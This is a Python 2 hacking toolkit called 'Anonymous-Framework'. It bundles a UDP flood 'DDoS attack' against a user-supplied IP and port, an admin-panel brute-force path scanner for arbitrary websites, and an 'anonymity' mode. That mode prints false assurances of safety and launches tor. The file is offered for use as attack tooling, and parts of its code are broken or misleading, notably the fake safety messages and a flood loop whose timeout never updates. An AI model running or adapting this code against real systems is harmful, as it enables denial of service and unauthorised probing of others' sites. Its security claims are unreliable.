#[Anonymous]~> Anonymous-Framework V-1.0.0
# -*- coding: utf-8 -*-
class logo: #Logos To Use
	lc1 = "printf '\033[1;31m'"
	lc2 = "printf '\033[1;32m'"
	lc3 = "printf '\033[1;33m'"
	lc4 = "printf '\033[1;34m'"
	lc5 = "printf '\033[1;35m'"
	lc6 = "printf '\033[1;36m'"
	logo1 = "figlet -f slant 'Be-Anony'"
	logo2 = "figlet -f slant 'SaFe-ViSit'"
	logo3 = "figlet -f slant 'Get-Ip'"
	logo4 = "figlet -f slant 'F-*-A-*-P'"
	logo5 = "figlet -f slant 'G-T-S-C-O-S'"
	logo6 = "figlet -f slant 'DDOS-Attack'"
	logo7 = "figlet -f slant 'H-E-L-P'"
class color: #Colors To Use
	red = "\033[1;31m"
	green = "\033[1;32m"
	yellow = "\033[1;33m"
	color1 = "\033[1;34m"
	color2 = "\033[1;35m"
	color3 = "\033[1;36m"
	white = "\033[1;37m"
class Anonymous: #To Make YourSelf SaFe
  	def HH(self): #Function To Be Anonymous
		import os, time, sys #The Usage Libraries
		import random
		ipCo = random.randint(80, 199) #rnd An Int For Ip CoMp
		try: #Try To Be Safe By [ Tor ]
			time.sleep(0.5)
			print "{}[Anonymous]{} Trying To Make SaFe SyStem".format(color.red, color.green)
			time.sleep(2)
			print "\n\n"
			print "{}[Anonymous]{} Now You Are SaFe".format(color.red, color.green)
			time.sleep(1)
			print "\n\n"
			print "{}[*]{}-{}[Anonymous] {}Anonymoused Succesfully".format(color.color1, color.white, color.red, color.green)
			time.sleep(1)
			print "\n\n"
                        print "{}[*] {}Now You Are SaFe But No 100% {}<SaFeing> ".format(color.color1, color.green, color.white)
			time.sleep(2)
			print "\n\n"
			print "{}[*]{}-{}[Anonymous]{} Now Running Good SaFe Don't Exit The Tool <N.R>".format(color.color1, color.white, color.red, color.green)
			time.sleep(1)
			print "\n\n"
			sock = open("AnonyDocs/Config.me", "w")
			sock.write("[*] IP \n{}.84.85.56 \n[*] PORT \n 443".format(ipCo))
			print "{}[*] {}Sock File Created Succes <~> ".format(color.color1, color.green)
			print "\n\n"
			TOR = "tor -config &> /dev/null"
			OS_COMMAND = TOR.replace("-config", " ")
			os.system(OS_COMMAND)
		except KeyboardInterrupt: #If User Exit The Tool
			print "\n{}[*] {}Exiting The Tool Thanks To Use Anonymous Tool".format(color.red, color.white)
			time.sleep(2)
			sys.exit()

def SaFeViSit(): #Function To visit Site With SaFe BroWser
	import os, sys, urllib2
	from urllib2 import HTTPError
	from time import sleep
	Url_To_Visit = sys.argv[2]
	print "{}[*]Now Run SV Script .. By Excute : {}python2 SV.py".format(color.red, color.green)
	sleep(2)
	print "\n\n{}[+]{} SaFe Now{} [+]".format(color.color1, color.red, color.color1)
	while True:
		try: #Try To Open Url
			urllib2.urlopen(Url_To_Visit)
		except HTTPError: #If Error In HTTP
			print "{}[*] {}The Site You Want To Visit Not Found {}[*]Error HTTP".format(color.color1, color.color3, color.red)
			break
#	except HTTPSError: #If Error HTPPS
#		print "[*]The Site You Want To Visit Not Found [*]Error HTTPS"
class GetIP: #Function To Get Ip Of Any WebSite
        def GetIp(self): #Get The Ip
                import sys, socket #Libs To Use
                site = sys.argv[2]
                Ip = socket.gethostbyname(site) #Get The Ip
                print "\n{}[+] {}The Ip Is :{} {}\n".format(color.red, color.green, color.color3, Ip)
class Find_Admin_Panel: #Function To Scan Admin Panel
	def FIND_ADMIN_PANEL(self): #Find Admin Panel
		import sys, os, sys, time
		from urllib2 import URLError, Request, urlopen, HTTPError
		link = sys.argv[2] #The Url To Scan
		if link == "www.facebook.com":
			print "{}[*]{} Facebook Have A High Security".format(color.color1, color.green)
			sys.exit()
		elif link == "www.google.com":
			print "{}[*]{} Google Have a High Security".format(color.color1, color.green)
			sys.exit()
		elif link == "www.instagram.com":
			print "{}[*]{} Instagram Have A High Security".format(color.color1, color.green)
			sys.exit()
		elif link == "www.twitter.com":
			print "{}[*] {}Twitter Have A High Security".format(color.color1, color.green)
			sys.exit()
		else:
			pass

		paths = open("AnonyDocs/paths.txt", "r") #List Of Paths 
			#Find Admin Panel
		while True:
			pth = paths.readline() #Read Paths
			try:
#		print "[*] %s Path Loaded " % len(pth)
				url = "http://" + link + "/" + pth
	 			request = Request(url) #req The Link
				urlopen(request) #Open The Url
				print "{}[*]{} {} >> {}Found In The WebSite!! ".format(color.green ,color.color3 ,url ,color.color1 )
				break;
			except HTTPError: #If Error :
 				print "{}[-]{} {} {} >> Not Found".format(color.red, color.green, url, color.color1)
			except URLError: #If Error :
				print "{}[-]{} Error In The Link >> {}".format(color.red, color.color3, link)
				break; #Break Of The Program 
class Get_The_Source_Code_Of_Site: #Function To Get Source Code Of A Link
	def G_T_S_C_O_S(self): #Get The Source Code
		import sys, os
		from urllib2 import Request, urlopen, URLError, HTTPError
#libs To Use
			#the Start Of Program
		URL = sys.argv[2]
	  	try:
			Name = raw_input("{}[+]{} Enter Name For The Source File >> ".format(color.color1, color.color3))
			request = Request(URL)
			UrlOpen = urlopen(request)
			Source = UrlOpen.read()
			SourceFile = open("Output/" + Name ,"w")
			SourceFile.write(Source)
			print "{}[+]{}The Source File Saved In Output File With Name [ {} ]".format(color.color1, color.color3, Name)
		except KeyboardInterrupt:
			print "{}[*]{} Exiting The Tool Thanks To Use Anonymous Framework".format(color.color3, color.red)
		except HTTPError:
			print "{}[-]{} The Link You Insert Is Incorrect ".format(color.red, color.color1)
		except URLError:
			print "{}[-] {}Error In The Url !! ".format(color.red, color.color1)
class HelpMSG: #To Help The User
	def HelpMsg(self):
		print """
			>>
				{}

	     Hi This Tool By @Emad Fakhry [MemoHack

	        My FaceBook [ emad.fakhry.35912 ]

	use : python2 Anonymous.py -h / To Show This MSG

	use : python2 Anonymous.py -S / To Make YourSelf SaFe

	use : python2 Anonymous.py -SV <W.B> / To Make SaFe Visit <W.S>

	use : python2 Anonymous.py -GI <W.S.N> / To Get Any WebSite Ip

	use : python2 Anonymous.py -FAP <W.S> / To Brute Force Admin Panel

	use : python2 Anonymous.py -GTSCOS <LINK> / To Get A Source Code Of Any Link 

	use : python2 Anonymous.py -DDOS  / To Do DDOS ATTACK

			>>
		      """.format(color.color1)
class DDOS_Attack: #Function To Make DDos Attack
	def DDOS_ATTACK(self):
		import time, os, sys, socket, random
		SOCKET = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		ip = str(raw_input("{}[*] {}Enter The Ip To DDOS >> ".format(color.color1, color.green)))
#		ip = "##########"
		port = int(raw_input("{}[*] {}Enter The Port To Connect >> ".format(color.color1, color.green)))
		packet = "Fuck Fuck Fuck Fuck Fuck"
		time = time.time()
		timeout = time + 600
		try:
			ps = 0
			while True:
				if time > timeout:
					break;
				else:
			 		pass
				try:
					SOCKET.connect((ip, port))
					SOCKET.sendto(packet, (ip, port))
					print " {}{}{} Packet Sent To{} {}{} In Port{} {}".format(color.color1, ps, color.green, color.color3, ip, color.green, color.color3, port)
					ps = ps + 1
				except KeyboardInterrupt:
					print "{}[AnonymousDDT]{} [*]{} Exiting The Tool ".format(color.red, color.color1, color.color3)
					break;
		except socket.error:
			print "{} No Connection !! ".format(color.red)
import sys ,time, os

try: #Try To Run The Functions

	if sys.argv[1] == "-SV":
		os.system(logo.lc1)
		os.system(logo.logo2)
		SaFeViSit()
	elif sys.argv[1] == "-S":
		os.system(logo.lc2)
		os.system(logo.logo1)
		AN = Anonymous()
		AN.HH()
	elif sys.argv[1] == "-GI":
		os.system(logo.lc3)
		os.system(logo.logo3)
		GI = GetIP()
		GI.GetIp()
	elif sys.argv[1] == "-h":
		os.system(logo.lc4)
		os.system(logo.logo7)
		HM = HelpMSG()
		HM.HelpMsg()
	elif sys.argv[1] == "-DDOS":
		os.system(logo.lc5)
		os.system(logo.logo6)
		DDA = DDOS_Attack()
		DDA.DDOS_ATTACK()
	elif sys.argv[1] == "-FAP":
		os.system(logo.lc6)
		os.system(logo.logo4)
		FAP = Find_Admin_Panel()
		FAP.FIND_ADMIN_PANEL()
	elif sys.argv[1] == "-GTSCOS":
		os.system(logo.lc6)
		os.system(logo.logo5)
		GTSCOS = Get_The_Source_Code_Of_Site()
		GTSCOS.G_T_S_C_O_S()
	else:
		import time
		print "{}[-]{} The Usage Option Not Found !!".format(color.color1, color.red)
		print "\n\n"
		time.sleep(1)
		HM = HelpMSG()
		HM.HelpMsg()

except IndexError: #If Error Index :

	HM = HelpMSG()
	HM.HelpMsg()
	time.sleep(1.5)
	sys.exit()
	HM = HelpMSG()
	HM.HeloMsg()

#Anonymous-Framework By Emad Fakhry ::: MemoHack :::

